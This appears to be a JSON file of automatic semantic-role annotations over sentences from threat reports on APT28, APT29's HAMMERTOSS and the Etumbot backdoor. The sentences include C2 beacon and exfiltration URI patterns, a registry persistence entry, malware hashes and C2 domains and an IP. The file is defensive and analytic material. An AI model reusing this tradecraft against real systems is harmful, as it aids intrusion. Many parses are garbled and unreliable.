"\n\n CHOPSTICK encrypts an 11-byte sequence in the \u201cai=\u201d parameter": {"encrypts": {"ARG0": {"text": "CHOPSTICK"}, "V": {"text": "encrypts", "index": 1}, "ARG1": {"text": "an 11-byte sequence in the \u201c ai="}}}, " We identified\nan APT28 lure containing a decoy document with a list\nof British officers and U.S": {"identified": {"ARG0": {"text": "We"}, "V": {"text": "identified", "index": 1}, "ARG1": {"text": "an APT28 lure containing a decoy document with a list of British officers and U.S"}}, "containing": {"ARG0": {"text": "an APT28"}, "V": {"text": "containing", "index": 5}, "ARG1": {"text": "a decoy document with a list of British officers and U.S"}}}, "\nWe call SOURFACE (samples are frequently\nnamed netids.dll) a first stage downloader\nbecause its primary job is to retrieve a second\nstage payload from a C2 server": {"call": {"ARG0": {"text": "We"}, "V": {"text": "call", "index": 1}, "ARG2": {"text": "SOURFACE"}, "ARG1": {"text": "( samples are frequently named netids.dll ) a first stage downloader"}, "ARGM-CAU": {"text": "because its primary job is to retrieve a second stage payload from a C2 server"}}, "are": {"V": {"text": "are", "index": 5}}, "named": {"ARG1": {"text": "samples"}, "ARGM-TMP": {"text": "frequently"}, "V": {"text": "named", "index": 7}, "ARG2": {"text": "netids.dll ) a first stage downloader"}, "ARGM-CAU": {"text": "because its primary job is to retrieve a second stage payload from a C2 server"}}, "is": {"ARG1": {"text": "its primary job"}, "V": {"text": "is", "index": 18}, "ARG2": {"text": "to retrieve a second stage payload from a C2 server"}}, "retrieve": {"V": {"text": "retrieve", "index": 20}, "ARG1": {"text": "a second stage payload from a C2 server"}}}, " Figure 13\nbelow contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp": {"contains": {"ARG0": {"text": "Figure 13 below"}, "V": {"text": "contains", "index": 3}, "ARG1": {"text": "an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp"}}, "uploading": {"ARG0": {"text": "an HTTP POST request"}, "V": {"text": "uploading", "index": 11}, "ARG2": {"text": "a segment/ from edg6EF885E2.tmp"}}}, "\n\nThe message body of the POST request is also Base64 encoded": {"is": {"ARG1": {"text": "The message body of the POST request"}, "V": {"text": "is", "index": 7}, "ARGM-ADV": {"text": "also"}, "ARG2": {"text": "Base64 encoded"}}, "encoded": {"ARG1": {"text": "Base64"}, "V": {"text": "encoded", "index": 10}}}, "                                                 \n                                                                      \nIn addition, APT28 used one domain for command                        \nand control sessions (baltichost[.]org) that was                      \nthemed after the Baltic Host exercises": {"used": {"ARGM-DIS": {"text": "In addition"}, "ARG0": {"text": "APT28"}, "V": {"text": "used", "index": 4}, "ARG1": {"text": "one domain"}, "ARG2": {"text": "for command and"}}, "was": {"R-ARG1": {"text": "that"}, "V": {"text": "was", "index": 16}, "ARG2": {"text": "themed"}, "ARGM-TMP": {"text": "after the Baltic Host exercises"}}, "themed": {"ARG1": {"text": "control sessions ( baltichost[.]org )"}, "R-ARG1": {"text": "that"}, "V": {"text": "themed", "index": 17}, "ARGM-TMP": {"text": "after the Baltic Host exercises"}}, "exercises": {"ARG0": {"text": "the Baltic Host"}, "V": {"text": "exercises", "index": 22}}}, "\n</list>\n\n APT29: AN ADAPTIVE AND DISCIPLINED\n THREAT GROUP\n HAMMERTOSS illustrates APT29\u2019s ability to adapt\n quickly during operations to avoid detection and\n removal": {"illustrates": {"ARG0": {"text": "APT29 : AN ADAPTIVE AND DISCIPLINED THREAT GROUP HAMMERTOSS"}, "V": {"text": "illustrates", "index": 9}, "ARG1": {"text": "APT29 \u2019s ability to adapt quickly during operations to avoid detection and removal"}}, "adapt": {"V": {"text": "adapt", "index": 14}, "ARGM-MNR": {"text": "quickly"}, "ARGM-TMP": {"text": "during operations"}, "ARGM-PRP": {"text": "to avoid detection and removal"}}, "avoid": {"V": {"text": "avoid", "index": 19}, "ARG1": {"text": "detection and removal"}}}, "        \n                                                           \nIn several cases, the commands directed\n                                                           \nHAMMERTOSS to upload information from\n                                                           \nvictim networks to accounts on cloud storage\nservices using login credentials received in\nStage 4": {"directed": {"ARGM-LOC": {"text": "In several cases"}, "ARG0": {"text": "the commands"}, "V": {"text": "directed", "index": 6}, "ARG1": {"text": "HAMMERTOSS"}, "ARG2": {"text": "to upload information from victim networks to accounts on cloud storage services"}, "ARGM-MNR": {"text": "using login credentials received in Stage 4"}}, "upload": {"ARG0": {"text": "HAMMERTOSS"}, "V": {"text": "upload", "index": 9}, "ARG1": {"text": "information/ from victim networks"}, "ARGM-PNC": {"text": "to accounts on cloud storage services"}, "ARGM-MNR": {"text": "using login credentials received in Stage 4"}}, "using": {"V": {"text": "using", "index": 20}, "ARG1": {"text": "login credentials received in Stage 4"}}, "received": {"V": {"text": "received", "index": 23}, "ARGM-LOC": {"text": "in"}}}, " In our GitHub example, the decrypted\ndata instructed the backdoor to obtain a list of\nrunning tasks\u2014reconnaissance on the victim\nnetwork\u2014and upload it to a specific account on a\ncloud storage service using the login credentials": {"decrypted": {"V": {"text": "decrypted", "index": 6}, "ARG1": {"text": "data"}}, "instructed": {"ARGM-LOC": {"text": "In our GitHub example"}, "ARG0": {"text": "the decrypted data"}, "V": {"text": "instructed", "index": 8}, "ARG1": {"text": "the backdoor"}, "ARG2": {"text": "to obtain a list of running tasks \u2014 reconnaissance on the victim network \u2014 and upload it to a specific account on a cloud storage service using the login credentials"}}, "obtain": {"V": {"text": "obtain", "index": 12}, "ARG1": {"text": "a list of running tasks \u2014 reconnaissance on the victim network \u2014"}}, "running": {"V": {"text": "running", "index": 16}, "ARG1": {"text": "tasks \u2014 reconnaissance on the victim network \u2014"}}, "upload": {"V": {"text": "upload", "index": 26}, "ARG1": {"text": "it"}, "ARG2": {"text": "to a specific account"}, "ARGM-LOC": {"text": "on a cloud"}, "ARGM-ADV": {"text": "storage service/ using the login credentials"}}, "using": {"V": {"text": "using", "index": 37}, "ARG1": {"text": "the login credentials"}}}, "\n\n</figure>\n\n <caption> Figure 6: Executing Commands and Removing Data </caption>                                        \n\n\n\n\nT\n        he encrypted data in the image may include         \n        instructions to execute commands via               \n        PowerShell, execute a direct command or            \nfile, or save an executable to disk and execute it": {"encrypted": {"ARG0": {"text": "he"}, "V": {"text": "encrypted", "index": 2}, "ARG1": {"text": "data"}, "ARGM-LOC": {"text": "in the image"}}, "may": {"V": {"text": "may", "index": 7}}, "include": {"ARG2": {"text": "T he encrypted data in the image"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "include", "index": 8}, "ARG1": {"text": "instructions to execute commands via PowerShell , execute a direct command or file , or save an executable to disk and execute it"}}, "execute": {"V": {"text": "execute", "index": 11}, "ARG1": {"text": "commands"}, "ARGM-MNR": {"text": "via PowerShell"}}, "execute_2": {"V": {"text": "execute", "index": 16}, "ARG1": {"text": "a direct command or file"}}, "save": {"V": {"text": "save", "index": 24}, "ARG1": {"text": "an executable"}, "ARG3": {"text": "to disk"}}, "disk": {"ARG0": {"text": "an executable"}, "V": {"text": "disk", "index": 28}, "ARG1": {"text": "it"}}, "execute_3": {"V": {"text": "execute", "index": 30}, "ARG1": {"text": "it"}}}, "\n   Other tools use Twitter \nto relay\n   instructions, including:2\n<list>\n   \u2022   MiniDuke, a \nWindows-based\n      backdoor that is a \nsuspected\n      Russian tool\n   \u2022   the Sninfs botnet\n   \u2022   Flashback, a Mac-based\n      backdoor\n</list>\n   MiniDuke behaves \nsimilarly\n   to HAMMERTOSS by not only\n   using Twitter for CnC, \nbut also\n   by downloading image \nfiles\n   containing encrypted, \nappended\n   content": {"use": {"ARG1": {"text": "Other tools"}, "V": {"text": "use", "index": 2}, "ARGM-EXT": {"text": "Twitter"}, "ARG2": {"text": "to relay instructions , including:2 MiniDuke behaves similarly to HAMMERTOSS by not only using Twitter for CnC"}}, "relay": {"V": {"text": "relay", "index": 5}, "ARG1": {"text": "instructions"}, "ARGM-MNR": {"text": "by not only using Twitter for CnC"}}, "behaves": {"ARG0": {"text": "MiniDuke"}, "V": {"text": "behaves", "index": 10}, "ARGM-MNR": {"text": "similarly/ by not only using Twitter for CnC"}, "ARG1": {"text": "to HAMMERTOSS"}}, "HAMMERTOSS": {"V": {"text": "HAMMERTOSS", "index": 13}, "ARGM-MNR": {"text": "by not only using Twitter for CnC"}}, "using": {"V": {"text": "using", "index": 17}, "ARG1": {"text": "Twitter"}, "ARG2": {"text": "for CnC"}}, "downloading": {"V": {"text": "downloading", "index": 25}, "ARG1": {"text": "image files containing encrypted"}}, "containing": {"V": {"text": "containing", "index": 28}, "ARG1": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "image files containing"}, "V": {"text": "encrypted", "index": 29}}, "appended": {"ARG0": {"text": "Other tools use Twitter to relay instructions , including:2 MiniDuke behaves similarly to HAMMERTOSS"}, "ARG2": {"text": "by downloading image files containing encrypted"}, "V": {"text": "appended", "index": 31}, "ARG1": {"text": "content"}}}, " Likewise, the group\n   appears to almost solely uses compromised\n   servers for CnC to enhance the security of its\n   operations and maintains a rapid development\n   cycle for its malware by quickly modifying tools \nto\n   undermine detection": {"appears": {"ARGM-DIS": {"text": "Likewise"}, "ARG1": {"text": "the group"}, "V": {"text": "appears", "index": 4}, "C-ARG1": {"text": "to almost solely uses compromised servers for CnC to enhance the security of its operations and maintains a rapid development cycle for its malware by quickly modifying tools to undermine detection"}}, "uses": {"ARG0": {"text": "the group"}, "ARGM-MNR": {"text": "almost solely"}, "V": {"text": "uses", "index": 8}, "ARG1": {"text": "compromised servers"}, "ARG2": {"text": "for CnC"}, "ARGM-PRP": {"text": "to enhance the security of its operations"}}, "enhance": {"ARG0": {"text": "the group"}, "V": {"text": "enhance", "index": 14}, "ARG1": {"text": "the security of its operations"}}, "maintains": {"ARG0": {"text": "the group"}, "V": {"text": "maintains", "index": 21}, "ARG1": {"text": "a rapid development cycle for its malware"}, "ARGM-MNR": {"text": "by quickly modifying tools to undermine detection"}}, "modifying": {"ARGM-MNR": {"text": "quickly"}, "V": {"text": "modifying", "index": 31}, "ARG1": {"text": "tools"}}, "undermine": {"V": {"text": "undermine", "index": 34}, "ARG1": {"text": "detection"}}}, " APT29 tries to\n                   undermine the detection of the malware by\n                                                                       \n                   adding layers of obfuscation and mimicking\n\n                   the behavior of legitimate users": {"tries": {"ARG0": {"text": "APT29"}, "V": {"text": "tries", "index": 1}, "ARG1": {"text": "to undermine the detection of the malware by adding layers of obfuscation and mimicking the behavior of legitimate users"}}, "undermine": {"ARG0": {"text": "APT29"}, "V": {"text": "undermine", "index": 3}, "ARG1": {"text": "the detection of the malware"}, "ARGM-MNR": {"text": "by adding layers of obfuscation and mimicking the behavior of legitimate users"}}, "adding": {"ARG0": {"text": "APT29"}, "V": {"text": "adding", "index": 10}, "ARG1": {"text": "layers of obfuscation"}}, "mimicking": {"ARG0": {"text": "APT29"}, "V": {"text": "mimicking", "index": 15}, "ARG1": {"text": "the behavior of legitimate users"}}}, " The data may\ninclude commands or login credentials to\n                                                   \nupload a victim\u2019s data to a cloud storage          \nservice": {"may": {"V": {"text": "may", "index": 2}}, "include": {"ARG2": {"text": "The data"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "include", "index": 3}, "ARG1": {"text": "commands or login credentials to upload a victim \u2019s data to a cloud storage service"}}, "login": {"V": {"text": "login", "index": 6}, "ARG0": {"text": "credentials"}}, "upload": {"V": {"text": "upload", "index": 9}, "ARG1": {"text": "a victim \u2019s data"}, "ARG2": {"text": "to a cloud storage service"}}}, " Each                                                    \n\n  variant uses different methods to acquire           \n  CnC instructions, either by directly\n  accessing a hard-coded website or                   \n  accessing Twitter as an intermediary": {"uses": {"ARG0": {"text": "Each variant"}, "V": {"text": "uses", "index": 2}, "ARG1": {"text": "different methods"}, "ARG2": {"text": "to acquire CnC instructions"}, "ARGM-MNR": {"text": "either by directly accessing a hard - coded website or accessing Twitter as an intermediary"}}, "acquire": {"ARG0": {"text": "Each variant"}, "V": {"text": "acquire", "index": 6}, "ARG1": {"text": "CnC instructions"}}, "accessing": {"ARGM-MNR": {"text": "directly"}, "V": {"text": "accessing", "index": 13}, "ARG1": {"text": "a hard - coded website"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 17}, "ARG1": {"text": "website"}}, "accessing_2": {"V": {"text": "accessing", "index": 20}, "ARG1": {"text": "Twitter"}, "ARGM-PRD": {"text": "as an intermediary"}}}, "\n                               Using Twitter as an intermediary to deliver the\n                               second-stage CnC to HAMERTOSS allows APT29\n                               to dynamically direct the tool": {"Using": {"V": {"text": "Using", "index": 0}, "ARG1": {"text": "Twitter"}, "ARGM-PRD": {"text": "as an intermediary"}, "ARG2": {"text": "to deliver the second - stage CnC"}}, "deliver": {"V": {"text": "deliver", "index": 6}, "ARG1": {"text": "the second - stage CnC"}, "ARG2": {"text": "to HAMERTOSS"}}, "HAMERTOSS": {"V": {"text": "HAMERTOSS", "index": 13}}, "allows": {"V": {"text": "allows", "index": 14}, "ARG1": {"text": "APT29 to dynamically direct the tool"}}, "APT29": {"V": {"text": "APT29", "index": 15}, "ARGM-PRP": {"text": "to dynamically direct the tool"}}, "direct": {"ARG0": {"text": "APT29"}, "ARGM-MNR": {"text": "dynamically"}, "V": {"text": "direct", "index": 18}, "ARG1": {"text": "the tool"}}}, " When\na READFILE command is received from the C&C, the bot makes an initial call to\n/manage/asp/item.asp?id=<encrypted computer name>&&mux=<encrypted total file size> and checks for\nthe presence of \u201cI\u2019m Ready\u201d in the response from the C&C": {"is": {"V": {"text": "is", "index": 4}}, "received": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "a READFILE command"}, "V": {"text": "received", "index": 5}, "ARG2": {"text": "from the C&C"}}, "makes": {"ARGM-TMP": {"text": "When a READFILE command is received from the C&C"}, "ARG0": {"text": "the bot"}, "V": {"text": "makes", "index": 12}, "ARG1": {"text": "an initial call to /manage / asp / item.asp?id= and checks for the presence of \u201c I \u2019m Ready \u201d in the response from the C&C"}}, "\u2019m": {"ARG1": {"text": "I"}, "V": {"text": "\u2019m", "index": 30}, "ARG2": {"text": "Ready \u201d in the response from the"}}}, " The bot expects a\nmessage of \u201cOK\u201d from the C&C after each response is sent and will terminate the upload and send an\nerror message to the C&C in the case it is not seen": {"expects": {"ARG0": {"text": "The bot"}, "V": {"text": "expects", "index": 2}, "ARG1": {"text": "a message of \u201c OK \u201d from the C&C after each response is sent"}}, "is": {"V": {"text": "is", "index": 15}}, "sent": {"ARG1": {"text": "each response"}, "V": {"text": "sent", "index": 16}}, "will": {"V": {"text": "will", "index": 18}}, "terminate": {"ARG0": {"text": "a"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "terminate", "index": 19}, "ARG1": {"text": "the upload"}}, "send": {"ARGM-MOD": {"text": "will"}, "V": {"text": "send", "index": 23}, "ARG1": {"text": "an error message"}, "ARG2": {"text": "to the C&C"}, "ARGM-ADV": {"text": "in the case it is not seen"}}, "is_2": {"V": {"text": "is", "index": 34}}, "seen": {"ARG1": {"text": "it"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "seen", "index": 36}}}, "\n                   [6]\n\n                   <figure></figure>\n\nBelow are some of the names of Etumbot installers using RTLO successfully:\n\n<table>\n             File\t\n             \u00a0name\t\n \u00a0                                          Md5\t\n \u00a0\n             \u62db\u6a19\u898f\u7bc4 Finarcs.doc\t\n \u00a0                                      b3830791b0a397bea2ad943d151f856b\t\n \u00a0\n             1030522 \u65b0\u6a5f\u95dc\u7c4c\u5099\u5c0f\u7d44\u6e05\u55ae rcs.DOC\t\n \u00a0                             d444be30d2773b23de38ead1f2c6d117\t\n \u00a0\n             \u5831\u50f9\u55ae Finarcs.xls\t\n \u00a0                                       5340fcfb3d2fa263c280e9659d13ba93\t\n \u00a0\n             10342 \u59d4\u6703-\u00ad\u2010\u5be9 \u91d1\u878d\u6cd5\u898f\u4fee\u6b63\u8349\u6848\u5831\u544a rcs.xls\t\n \u00a0                       beb16ac99642f5c9382686fd8ee73e00\t\n \u00a0\n             \u570b\u767c\u6703 1030324 \u7b2c 1 \u6b21\u59d4\u54e1\u6703\u91cd\u8981\u8b70\u984c\u901a\u5831 finalrcs.xls\t\n \u00a0               4c703a8cfeded7f889872a86fb7c70cf\t\n \u00a0\n             APO\t\n \u00a0EPIF\t\n \u00a0\u9080\u8acb\u51fd rcs.xls\t\n \u00a0                            1ce47f76fca26b94b0b1d74610a734a4\t\n \u00a0</table>\n </section>\n\n<section>\n<heading>Stage 2: Persistence, Distraction, HTTP Beacon and Crypto Functionality</heading>\nAs the backdoor executes from our previous example, C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\\nkb71271.log is created and contains the following registry file to make the malware persistent:\n\n          [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] \"JavaSvc\"=\"C:\\\\Documents\n          and Settings\\\\User\\\\Application Data\\\\JAVA\\\\JavaSvc.exe\"\n\nThe dropper then calls regedit with kb71271.log as a parameter to modify the registry": {"executes": {"ARG0": {"text": "the backdoor"}, "V": {"text": "executes", "index": 6}, "ARGM-DIR": {"text": "from our previous example"}}, "is": {"V": {"text": "is", "index": 14}}, "created": {"V": {"text": "created", "index": 15}}, "contains": {"ARGM-ADV": {"text": "6 ]/ As the backdoor executes from our previous example"}, "ARGM-TMP": {"text": "C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\"}, "V": {"text": "contains", "index": 17}, "ARG1": {"text": "the following registry file to make the malware persistent"}}, "following": {"V": {"text": "following", "index": 19}, "ARG1": {"text": "registry file"}}, "make": {"ARG0": {"text": "the following registry file"}, "V": {"text": "make", "index": 23}, "ARG1": {"text": "the malware persistent"}}, "calls": {"ARGM-ADV": {"text": "As the backdoor executes from our previous example"}, "ARG0": {"text": "The dropper"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "calls", "index": 40}, "ARG2": {"text": "regedit with kb71271.log as a parameter to modify the registry"}}, "modify": {"V": {"text": "modify", "index": 48}, "ARG1": {"text": "the registry"}}}, "\n\nNext, C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log is created, filled with contents of the\nbait/distraction file, and then copied to C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\~t3fcj1.doc, which is then\nopened": {"is": {"V": {"text": "is", "index": 3}}, "created": {"ARGM-TMP": {"text": "Next/ C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log"}, "V": {"text": "created", "index": 4}}, "filled": {"V": {"text": "filled", "index": 6}, "ARG2": {"text": "with contents of the bait / distraction file"}}, "copied": {"ARGM-TMP": {"text": "Next/ C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log/ then"}, "V": {"text": "copied", "index": 18}, "ARG1": {"text": "to C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\~t3fcj1.doc"}}, "is_2": {"V": {"text": "is", "index": 23}}, "opened": {"R-ARG1": {"text": "which"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "opened", "index": 25}}}, " For example, both malware families have been\nseen using the same ka4281x3.log and kb71271.log files, both families have been observed calling back\nto the same Command & Control servers and have been used to target similar victim populations with\nsimilar attack methodologies": {"have": {"V": {"text": "have", "index": 6}}, "been": {"V": {"text": "been", "index": 7}}, "seen": {"ARGM-DIS": {"text": "For example"}, "ARG1": {"text": "both malware families/ using the same ka4281x3.log and kb71271.log files"}, "V": {"text": "seen", "index": 8}}, "using": {"ARG0": {"text": "both malware families"}, "V": {"text": "using", "index": 9}, "ARG1": {"text": "the same ka4281x3.log and kb71271.log files"}}, "have_2": {"V": {"text": "have", "index": 19}}, "been_2": {"V": {"text": "been", "index": 20}}, "observed": {"ARGM-DIS": {"text": "For example"}, "V": {"text": "observed", "index": 21}, "ARG1": {"text": "calling back to the same Command & Control servers"}}, "calling": {"ARG0": {"text": "both families"}, "V": {"text": "calling", "index": 22}, "ARG2": {"text": "to the same Command & Control servers"}}, "have_3": {"V": {"text": "have", "index": 32}}, "been_3": {"V": {"text": "been", "index": 33}}, "used": {"ARGM-DIS": {"text": "For example"}, "ARG1": {"text": "both families"}, "V": {"text": "used", "index": 34}, "ARG2": {"text": "to target similar victim populations with similar attack methodologies"}}, "target": {"ARG0": {"text": "both families"}, "V": {"text": "target", "index": 36}, "ARG1": {"text": "similar victim populations"}, "ARG2": {"text": "with similar attack methodologies"}}}, "\n\n<figure></figure>\n\n\nIf the C&C is online and responds to the beacon, then the RC4 key is delivered to the bot in a string of\nbase64 encoded characters": {"is": {"ARG1": {"text": "the C&C"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "online"}}, "responds": {"ARG0": {"text": "the C&C"}, "V": {"text": "responds", "index": 6}, "ARG1": {"text": "to the beacon"}}, "is_2": {"V": {"text": "is", "index": 15}}, "delivered": {"ARGM-ADV": {"text": "If the C&C is online and responds to the beacon/ then/ in a string of base64 encoded characters"}, "ARG1": {"text": "the RC4 key"}, "V": {"text": "delivered", "index": 16}, "ARG2": {"text": "to the bot"}}, "encoded": {"V": {"text": "encoded", "index": 25}, "ARG1": {"text": "characters"}}}, "\n\nWhen executed, the dropper loads up a resource named \"BINARY\" from the resource section then\ncreates the directory C:\\Documents and Settings\\User\\Application Data\\JAVA, then creates a temporary\nfile C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log then creates C:\\Documents and\nSettings\\User\\Application Data\\JAVA\\JavaSvc.exe from the aforementioned BINARY resource": {"executed": {"ARGM-TMP": {"text": "When"}, "V": {"text": "executed", "index": 1}, "ARG1": {"text": "the dropper"}}, "loads": {"ARGM-TMP": {"text": "When executed"}, "ARG0": {"text": "the dropper"}, "V": {"text": "loads", "index": 5}, "ARG1": {"text": "a resource named \" BINARY \""}, "ARGM-DIR": {"text": "from the resource section"}}, "named": {"ARG1": {"text": "a resource"}, "V": {"text": "named", "index": 9}, "ARG2": {"text": "\" BINARY \""}}, "creates": {"ARGM-TMP": {"text": "When executed/ then"}, "ARG0": {"text": "the dropper loads"}, "V": {"text": "creates", "index": 18}, "ARG1": {"text": "the directory C:\\Documents and Settings\\User\\Application"}}, "creates_2": {"ARGM-TMP": {"text": "When executed/ then/ then"}, "ARG0": {"text": "the dropper"}, "V": {"text": "creates", "index": 27}, "ARG1": {"text": "a temporary file C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log"}}, "creates_3": {"ARGM-TMP": {"text": "then"}, "V": {"text": "creates", "index": 33}, "ARG1": {"text": "C:\\Documents"}}}, "\n\nReturning to the first sample, once the dropper (ff5a7a610746ab5492cc6ab284138852) installs the\nEtumbot backdoor (82d4850a02375a7447d2d0381b642a72), an initial HTTP beacon is sent to the\nCommand & Control server that requests an RC4 encryption key": {"Returning": {"V": {"text": "Returning", "index": 0}, "ARG4": {"text": "to the first sample ) installs"}, "ARG1": {"text": "the dropper (/ ff5a7a610746ab5492cc6ab284138852"}}, "installs": {"ARG0": {"text": "the dropper )"}, "ARGM-TMP": {"text": "( ff5a7a610746ab5492cc6ab284138852"}, "V": {"text": "installs", "index": 12}, "ARG1": {"text": "the Etumbot/ ( 82d4850a02375a7447d2d0381b642a72 )"}, "ARGM-DIR": {"text": "backdoor"}}, "is": {"V": {"text": "is", "index": 24}}, "sent": {"ARGM-PRD": {"text": "Returning to the first sample"}, "ARGM-TMP": {"text": "once the dropper ( ff5a7a610746ab5492cc6ab284138852 ) installs the Etumbot backdoor"}, "ARG1": {"text": "an initial HTTP beacon"}, "V": {"text": "sent", "index": 25}, "ARG2": {"text": "to the Command & Control server that requests an RC4 encryption key"}}, "requests": {"ARG0": {"text": "the Command & Control server"}, "R-ARG0": {"text": "that"}, "V": {"text": "requests", "index": 33}, "ARG1": {"text": "an RC4 encryption key"}}}, "\n\nOnce the bot has received the encryption key, the bot sends a registration callback to the C&C\n/image/<encrypted data>.jpg containing the encrypted values of system information to include the\nNetBIOS name of the system, user name, IP address, if the system is using a proxy (Yes/No), and a\nnumeric value which may be some type of campaign code": {"has": {"V": {"text": "has", "index": 3}}, "received": {"ARG0": {"text": "the bot"}, "V": {"text": "received", "index": 4}, "ARG1": {"text": "the encryption key"}}, "sends": {"ARGM-TMP": {"text": "Once the bot has received the encryption key"}, "ARG0": {"text": "the bot"}, "V": {"text": "sends", "index": 11}, "ARG1": {"text": "a registration callback"}, "ARG2": {"text": "to the C&C /image/"}, "C-ARG1": {"text": "the encrypted values of system information/ to include the NetBIOS name of the system , user name , IP address , if the system is using a proxy ( Yes / No ) , and a numeric value which may be some type of campaign code"}}, "containing": {"ARG0": {"text": "the C&C /image/ .jpg"}, "V": {"text": "containing", "index": 20}, "ARG1": {"text": "the encrypted values of system information to include the NetBIOS name of the system , user name , IP address ,/ a numeric value which may be some type of campaign code"}}, "encrypted": {"V": {"text": "encrypted", "index": 22}, "ARG1": {"text": "values"}}, "include": {"V": {"text": "include", "index": 28}, "ARG1": {"text": "the NetBIOS name of the system , user name , IP address ,/ ( Yes / No ) , and a numeric value which may be some type of campaign code"}, "ARGM-ADV": {"text": "if the system is using a proxy"}}, "is": {"V": {"text": "is", "index": 45}}, "using": {"ARG0": {"text": "the system"}, "V": {"text": "using", "index": 46}, "ARG1": {"text": "a proxy ( Yes / No ) , and a numeric value"}}, "may": {"V": {"text": "may", "index": 60}}, "be": {"ARG1": {"text": "a numeric value"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "be", "index": 61}, "ARG2": {"text": "some type of campaign code"}}}, " If\nthe C&C is online, the decoded response payload will contain the RC4 key that is used to encrypt\nsubsequent communication": {"is": {"ARG1": {"text": "the C&C"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "online"}}, "will": {"V": {"text": "will", "index": 10}}, "contain": {"ARGM-ADV": {"text": "If the C&C is online"}, "ARG0": {"text": "the decoded response payload"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "contain", "index": 11}, "ARG1": {"text": "the RC4 key that is used to encrypt subsequent communication"}}, "is_2": {"V": {"text": "is", "index": 16}}, "used": {"ARG1": {"text": "the RC4 key"}, "R-ARG1": {"text": "that"}, "V": {"text": "used", "index": 17}, "ARG2": {"text": "to encrypt subsequent communication"}}, "encrypt": {"V": {"text": "encrypt", "index": 19}, "ARG1": {"text": "subsequent communication"}}}, " [1] A previous campaign using IXESHE malware was highlighted in 2012; the group\nused targeted emails with malicious PDF attachments to compromise East Asian governments,\nTaiwanese electronics manufacturers, and a telecommunications company": {"using": {"ARG0": {"text": "A previous campaign"}, "V": {"text": "using", "index": 6}, "ARG1": {"text": "IXESHE malware"}}, "was": {"V": {"text": "was", "index": 9}}, "highlighted": {"ARG1": {"text": "[ 1 ] A previous campaign using IXESHE malware"}, "V": {"text": "highlighted", "index": 10}, "ARGM-TMP": {"text": "in 2012"}}, "used": {"V": {"text": "used", "index": 16}}, "targeted": {"ARG0": {"text": "the group"}, "V": {"text": "targeted", "index": 17}, "ARG1": {"text": "emails with malicious PDF attachments"}, "ARGM-PNC": {"text": "to compromise East Asian governments , Taiwanese electronics manufacturers , and a telecommunications company"}}, "compromise": {"ARG0": {"text": "the group"}, "V": {"text": "compromise", "index": 24}, "ARG1": {"text": "East Asian governments , Taiwanese electronics manufacturers , and a telecommunications company"}}}, " The ka4281x3.log file is then\ndeleted": {"is": {"ARG1": {"text": "The ka4281x3.log file"}, "V": {"text": "is", "index": 3}, "ARGM-TMP": {"text": "then"}, "ARG2": {"text": "deleted"}}, "deleted": {"ARG1": {"text": "The ka4281x3.log file"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "deleted", "index": 5}}}, " The data is sent back to the C&C via the URI\n/article/30441/Review.asp?id=<encoded computer name>&&date=<file chunk data>": {"is": {"V": {"text": "is", "index": 2}}, "sent": {"ARG1": {"text": "The data"}, "V": {"text": "sent", "index": 3}, "ARG2": {"text": "back to the C&C"}, "ARGM-MNR": {"text": "via the URI /article/30441/Review.asp?id="}}}, " Other\ndomains registered in this name have also been used\nas C&C for IXESHE:\n\n securezone[.]yesplusno[.]com [10]\n prishmobile[.]googlesale[.]net\n yahoopush[.]googlesale[.]net\n\nThe IP address 98.188.111.244 has also been used as\na C&C for multiple IXESHE samples, beginning in at\nleast March 2013 and observed as recently as March                                                                                \n2014 with an Etumbot sample": {"registered": {"ARG1": {"text": "Other domains"}, "V": {"text": "registered", "index": 2}, "ARG2": {"text": "in this name"}}, "have": {"V": {"text": "have", "index": 6}}, "been": {"V": {"text": "been", "index": 8}}, "used": {"ARG1": {"text": "Other domains registered in this name"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "used", "index": 9}, "ARG2": {"text": "as C&C for IXESHE"}}, "has": {"V": {"text": "has", "index": 25}}, "been_2": {"V": {"text": "been", "index": 27}}, "used_2": {"ARG1": {"text": "yahoopush[.]googlesale[.]net The IP address 98.188.111.244"}, "ARGM-ADV": {"text": "also/ beginning in at least March 2013 and observed as recently as March 2014 with an Etumbot sample"}, "V": {"text": "used", "index": 28}, "ARG2": {"text": "as a C&C for multiple IXESHE samples"}}, "beginning": {"V": {"text": "beginning", "index": 37}, "ARGM-LOC": {"text": "in at least March 2013"}}, "observed": {"ARG1": {"text": "yahoopush[.]googlesale[.]net The IP address 98.188.111.244"}, "V": {"text": "observed", "index": 44}, "ARGM-TMP": {"text": "as recently as March 2014"}, "ARGM-ADV": {"text": "with an Etumbot sample"}}}, "\n\nA contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as\nfollows:\n\n         WINXPBOX|johnsmith|10.0.1.15|No Proxy|05147|\n\n<caption>A bot registration call to /image</caption>\n\n<figure></figure>\n\n\nOnce the bot has registered with the C&C, it will send periodic pings to ask for new commands to\nexecute": {"generated": {"ARG1": {"text": "this registration string"}, "V": {"text": "generated", "index": 7}, "ARG0": {"text": "by the Etumbot"}, "ARGM-TMP": {"text": "backdoor prior to encryption"}}, "is": {"ARG1": {"text": "A 